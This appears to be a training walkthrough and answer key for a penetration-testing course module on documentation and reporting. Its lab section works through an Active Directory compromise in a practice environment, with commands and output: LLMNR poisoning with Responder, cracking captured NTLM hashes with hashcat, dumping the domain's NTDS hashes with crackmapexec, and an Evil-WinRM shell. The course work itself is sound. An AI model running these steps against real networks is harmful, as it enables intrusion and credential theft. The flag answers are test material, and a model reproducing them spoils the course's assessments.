# Documentation & Reporting Module



| Section                                | Question Number | Answer                           |
| -------------------------------------- | --------------- | -------------------------------- |
| Notetaking & Organization              | Question 1      | Tmux                             |
| Notetaking & Organization              | Question 2      | [Ctrl] + [B] + [Shift] + [%]     |
| Types of Reports                       | Question 1      | Vulnerability Assessment         |
| Types of Reports                       | Question 2      | Black Box                        |
| Components of a Report                 | Question 1      | Executive Summary                |
| Components of a Report                 | Question 2      | False                            |
| How to Write Up a Finding              | Question 1      | Bad                              |
| Documentation & Reporting Practice Lab | Question 1      | d0c_pwN_r3p0rt_reP3at!           |
| Documentation & Reporting Practice Lab | Question 2      | 16e26ba33e455a8c338142af8d89ffbc |
| Documentation & Reporting Practice Lab | Question 3      | Reporter1!                       |
| Documentation & Reporting Practice Lab | Question 4      | Backup Operators                 |

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# Notetaking & Organization

## Question 1

### "What tool mentioned in this section can make logging a session easier?"

The `Tmux` tool can make logging a session easier.

Answer: `Tmux`

# Notetaking & Organization

## Question 2

### "Steve is learning about the tool that can make logging a session easier. He messages you for help mentioning that he would like to try to split the panes vertically. What do you tell him? (Answer format: \[key\] + \[key\] + \[key\], i.e., fill in the values for "key" and leave the brackets and + signs.)"

To split the panes vertically, Steve needs to type the key combinations `[Ctrl] + [B] + [Shift] + [%]`:

![Documentation_&_Reporting_image_1.png](https://academy.hackthebox.com/storage/walkthroughs/46/Documentation_&_Reporting_image_1.png)

Answer: `[Ctrl] + [B] + [Shift] + [%]`

# Types of Reports

## Question 1

### "Inlanefreight has contracted Elizabeth's firm to complete a type of assessment that is mostly automated where no exploitation is attempted. What kind of assessment is she going to be contracted for?"

Elizabeth will be contracted for a `Vulnerability Assessment`:

![Documentation_&_Reporting_image_2.png](https://academy.hackthebox.com/storage/walkthroughs/46/Documentation_&_Reporting_image_2.png)

Answer: `Vulnerability Assessment`

# Types of Reports

## Question 2

### "Nicolas is performing an external & internal penetration test for Inlanefreight. The client has only provided the company's name and a network connection onsite at their office and no additional detail. From what perspective is he performing the penetration test?"

Nicolas is performing the penetration test from a `Black Box` perspective:

![Documentation_&_Reporting_image_3.png](https://academy.hackthebox.com/storage/walkthroughs/46/Documentation_&_Reporting_image_3.png)

Answer: `Black Box`

# Components of a Report

## Question 1

### "What component of a report should be written in a simple to understand and non-technical manner?"

The `Executive Summary` should be written in a simple to understand and non-technical manner:

![Documentation_&_Reporting_image_4.png](https://academy.hackthebox.com/storage/walkthroughs/46/Documentation_&_Reporting_image_4.png)

Answer: `Executive Summary`

# Components of a Report

## Question 2

### "It is a good practice to name and recommend specific vendors in the component of the report mentioned in the last question. True or False?"

`False`; it is not a good practice to name and recommend specific vendors in Executive Summaries:

![Documentation_&_Reporting_image_5.png](https://academy.hackthebox.com/storage/walkthroughs/46/Documentation_&_Reporting_image_5.png)

Answer: `False`

# How to Write Up a Finding

## Question 1

### ""An attacker can own your whole entire network cause your DC is way out of date. You should really fix that\!". Is this a Good or Bad remediation recommendation? (Answer Format: Good or Bad)"

`Bad`; this is an example of a bad remediation recommendation; it does not mention to the reader what exactly is vulnerable/dangerous about the DC, nor does it explain the consequences of having a not updated DC, thus, it requires the reader to research about it.

Answer: `Bad`

# Documentation & Reporting Practice Lab

## Question 1

### "Connect to the testing VM using Xfreerdp and practice testing, documentation, and reporting against the target lab. Once the target spawns, browse to the WriteHat instance on port 443 and authenticate with the provided admin credentials. Play around with the tool and practice adding findings to the database to get a feel for the reporting tools available to us. Remember that all data will be lost once the target resets, so save any practice findings locally! Next, complete the in-progress penetration test. Once you achieve Domain Admin level access, submit the contents of the flag.txt file on the Administrator Desktop on the DC01 host."

After spawning the target machine, students need to connect to it using `xfreerdp` with the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.99]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.117.17 /u:htb-student /p:HTB_@cademy_stdnt!

[05:05:55:946] [2293:2294] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[05:05:55:947] [2293:2294] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[05:05:55:947] [2293:2294] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[05:05:55:947] [2293:2294] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[05:05:56:273] [2293:2294] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
```

![Documentation_&_Reporting_image_6.png](https://academy.hackthebox.com/storage/walkthroughs/46/Documentation_&_Reporting_image_6.png)

Once the connection is successfully established, students need to open `Obsidian` and read the notes taken by the previous pentester under the "Evidence" Vault. Poking around all the files, students will discover four credential pairs:

- `dhawkins:Bacon1989`

![Documentation_&_Reporting_image_7.png](https://academy.hackthebox.com/storage/walkthroughs/46/Documentation_&_Reporting_image_7.png)

- `Administrator:Welcome123!`:

![Documentation_&_Reporting_image_8.png](https://academy.hackthebox.com/storage/walkthroughs/46/Documentation_&_Reporting_image_8.png)

- `asmith:Welcome1` and `abouldercon:Welcome1`:

![Documentation_&_Reporting_image_9.png](https://academy.hackthebox.com/storage/walkthroughs/46/Documentation_&_Reporting_image_9.png)

Students will also find IP addresses of other Windows targets, which are:

- `DC`: `172.16.5.5`
- `DEV01`: `172.16.5.200`
- `FILE01`: `172.16.5.130`

Additionally, students will also find some partial output from `Responder` under "H3 - LLMNR&NBT-NS Response Spoofing":

![Documentation_&_Reporting_image_10.png](https://academy.hackthebox.com/storage/walkthroughs/46/Documentation_&_Reporting_image_10.png)

From the Parrot instance that students have connected to, they need to start `Responder` and wait until they receive the hash for `hackupagent`:

Code: shell

```shell
sudo responder -I ens224 -wrvf
```

```shell-session
┌─[htb-student@par01]─[~]
└──╼ $sudo responder -I ens224 -wrvf

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:d676321cba201443:6B2BEBF7C5D0B3CC03E9B99D400B2297:0101000000000000008657AA9AB2D8017E73A2189A8B30100000000002000800560036003800310001001E00570049004E002D00580037005100580053004F0053004D00320057004E0004003400570049004E002D00580037005100580053004F0053004D00320057004E002E0056003600380031002E004C004F00430041004C000300140056003600380031002E004C004F00430041004C000500140056003600380031002E004C004F00430041004C0007000800008657AA9AB2D80106000400020000000800300030000000000000000000000000300000AD8DEA4B650FD0F90A06E5CB7151BDAA3F29582D0BFF65EFD2DDBAB00A3BCA740A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```

Thereafter, students need to crack the NTLMv2 hash of `backupagent` using `hashcat`:

Code: shell

```shell
hashcat -w 3 -O -m 5600 "backupagent::INLANEFREIGHT:d676321cba201443:6B2BEBF7C5D0B3CC03E9B99D400B2297:0101000000000000008657AA9AB2D8017E73A2189A8B30100000000002000800560036003800310001001E00570049004E002D00580037005100580053004F0053004D00320057004E0004003400570049004E002D00580037005100580053004F0053004D00320057004E002E0056003600380031002E004C004F00430041004C000300140056003600380031002E004C004F00430041004C000500140056003600380031002E004C004F00430041004C0007000800008657AA9AB2D80106000400020000000800300030000000000000000000000000300000AD8DEA4B650FD0F90A06E5CB7151BDAA3F29582D0BFF65EFD2DDBAB00A3BCA740A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" /usr/share/wordlists/rockyou.txt
```

```shell-session
┌─[htb-student@par01]─[~]
└──╼ $hashcat -w 3 -O -m 5600 "backupagent::INLANEFREIGHT:d676321cba201443:6B2BEBF7C5D0B3CC03E9B99D400B2297:0101000000000000008657AA9AB2D8017E73A2189A8B30100000000002000800560036003800310001001E00570049004E002D00580037005100580053004F0053004D00320057004E0004003400570049004E002D00580037005100580053004F0053004D00320057004E002E0056003600380031002E004C004F00430041004C000300140056003600380031002E004C004F00430041004C000500140056003600380031002E004C004F00430041004C0007000800008657AA9AB2D80106000400020000000800300030000000000000000000000000300000AD8DEA4B650FD0F90A06E5CB7151BDAA3F29582D0BFF65EFD2DDBAB00A3BCA740A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" /usr/share/wordlists/rockyou.txt

hashcat (v6.2.5-275-gc1df53b47) starting

<SNIP>

BACKUPAGENT::INLANEFREIGHT:d676321cba201443:6b2bebf7c5d0b3cc03e9b99d400b2297:0101000000000000008657aa9ab2d8017e73a2189a8b30100000000002000800560036003800310001001e00570049004e002d00580037005100580053004f0053004d00320057004e0004003400570049004e002d00580037005100580053004f0053004d00320057004e002e0056003600380031002e004c004f00430041004c000300140056003600380031002e004c004f00430041004c000500140056003600380031002e004c004f00430041004c0007000800008657aa9ab2d80106000400020000000800300030000000000000000000000000300000ad8dea4b650fd0f90a06e5cb7151bdaa3f29582d0bff65efd2ddbab00a3bca740a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Recovery7
```

Subsequently, students need to connect to the DC with `xfreerdp` using the credentials `backupagent:Recovery7`:

Code: shell

```shell
xfreerdp /v:172.16.5.5 /u:backupagent /p:Recovery7
```

```shell-session
┌─[htb-student@par01]─[~]
└──╼ $xfreerdp /v:172.16.5.5 /u:backupagent /p:Recovery7

[00:51:50:616] [3725:3726] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state

<SNIP>

Certificate details for 172.16.5.5:3389 (RDP-Server):
	Common Name: DC01.INLANEFREIGHT.LOCAL
	Subject:     CN = DC01.INLANEFREIGHT.LOCAL
	Issuer:      CN = DC01.INLANEFREIGHT.LOCAL
	Thumbprint:  ef:c9:84:11:d2:4a:4d:7c:2b:c5:8b:86:b8:45:c1:20:4e:2b:be:0a:d9:d3:41:85:2f:6b:31:1d:e3:75:86:fb
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

![Documentation_&_Reporting_image_11.png](https://academy.hackthebox.com/storage/walkthroughs/46/Documentation_&_Reporting_image_11.png)

![Documentation_&_Reporting_image_12.png](https://academy.hackthebox.com/storage/walkthroughs/46/Documentation_&_Reporting_image_12.png)

Once the connection is successfully established, students need to navigate to `C:\Users\Administrator\Desktop\` to read the flag `d0c_pwN_r3p0rt_reP3at!`:

![Documentation_&_Reporting_image_13.png](https://academy.hackthebox.com/storage/walkthroughs/46/Documentation_&_Reporting_image_13.png)

Answer: `d0c_pwN_r3p0rt_reP3at!`

# Documentation & Reporting Practice Lab

## Question 2

### "After achieving Domain Admin, submit the NTLM hash of the KRBTGT account."

Using the same RDP connection from question 1, students need to use `crackmapexec` to dump NTDS on the DC, utilizing the credentials `backupagent:Recovery7`:

Code: shell

```shell
sudo crackmapexec smb 172.16.5.5 -u backupagent -p Recovery7 --ntds
```

```shell-session
┌─[htb-student@par01]─[~]
└──╼ $sudo crackmapexec smb 172.16.5.5 -u backupagent -p Recovery7 --ntds

SMB         172.16.5.5      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    DC01             [+] INLANEFREIGHT.LOCAL\backupagent:Recovery7 (Pwn3d!)
SMB         172.16.5.5      445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         172.16.5.5      445    DC01             inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
SMB         172.16.5.5      445    DC01             guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.5.5      445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::

<SNIP>
```

The hash of the `krbtgt` account `16e26ba33e455a8c338142af8d89ffbc` will be among the first ones displayed by `crackmapexec`. Alternatively, students can use `grep` on the log files of `crackmapexec` under `/root/.cme/logs`:

Code: shell

```shell
grep "krbtgt" /root/.cme/logs/DC01_172.16.5.5_2022-08-18_023751.ntds
```

```shell-session
┌─[htb-student@par01]─[~] 
└──╼ $grep "krbtgt" /root/.cme/logs/DC01_172.16.5.5_2022-08-18_023751.ntds

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
```

Answer: `16e26ba33e455a8c338142af8d89ffbc`

# Documentation & Reporting Practice Lab

## Question 3

### "Dump the NTDS file and perform offline password cracking. Submit the password of the svc\_reporting user as your answer."

Using the same RDP connection from Question 1, students need to use `crackmapexec` to dump NTDS on the DC, using the credentials `backupagent:Recovery7`:

Code: shell

```shell
sudo crackmapexec smb 172.16.5.5 -u backupagent -p Recovery7 --ntds | tee hashes.txt SMB
```

```shell-session
┌─[htb-student@par01]─[~] 
└──╼ $sudo crackmapexec smb 172.16.5.5 -u backupagent -p Recovery7 --ntds | tee hashes.txt SMB

172.16.5.5      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB         172.16.5.5      445    DC01             [+] INLANEFREIGHT.LOCAL\backupagent:Recovery7 (Pwn3d!) SMB         172.16.5.5      445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull... SMB         172.16.5.5      445    DC01             inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::

SMB         172.16.5.5      445    DC01             [+] Dumped 14008 NTDS hashes to /root/.cme/logs/DC01_172.16.5.5_2022-08-18_023751.ntds of which 2964 were added to the database
```

Subsequently, students need to use `grep` on the log file of `crackmapexec` to filter for the account `svc_reporting`:

```shell
grep "svc_reporting" /root/.cme/logs/DC01_172.16.5.5_2022-08-18_023751.ntds
```

```shell-session
┌─[htb-student@par01]─[~]
└──╼ $grep "svc_reporting" /root/.cme/logs/DC01_172.16.5.5_2022-08-18_023751.ntds

svc_reporting:7608:aad3b435b51404eeaad3b435b51404ee:a6d3701ae426329951cf5214b7531140:::
```

At last, students need to crack the hash using `hashcat`:

```shell
hashcat -w 3 -O -m 1000 "a6d3701ae426329951cf5214b7531140" /usr/share/wordlists/rockyou.txt
```

```shell-session
┌─[htb-student@par01]─[~]
└──╼ $hashcat -w 3 -O -m 1000 "a6d3701ae426329951cf5214b7531140" /usr/share/wordlists/rockyou.txt

hashcat (v6.2.5-275-gc1df53b47) starting

<SNIP>

a6d3701ae426329951cf5214b7531140:Reporter1!
```

The plaintext of the cracked password hash is `Reporter1!`.

Answer: `Reporter1!`

# Documentation & Reporting Practice Lab

## Question 4

### "What powerful local group does this user belong to?"

Using the same RDP connection from question 1, students need to connect to the DC using `Evil-WinRM` with the credentials `backupagent:Recovery7`:

```shell
evil-winrm -i 172.16.5.5 -u backupagent -p Recovery7
```

```shell-session
┌─[htb-student@par01]─[~]
└──╼ $evil-winrm -i 172.16.5.5 -u backupagent -p Recovery7

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\backupagent\Documents> 
```

Then, students need to issue the command `net user svc_reporting`, to find out that the user `svc_reporting` belongs to the powerful `Backup Operators` local group:

```shell
net user svc_reporting
```

```shell-session
*Evil-WinRM* PS C:\Users\backupagent\Documents> net user svc_reporting
User name                    svc_reporting
Full Name

<SNIP>

Local Group Memberships      *Backup Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

Answer: `Backup Operators`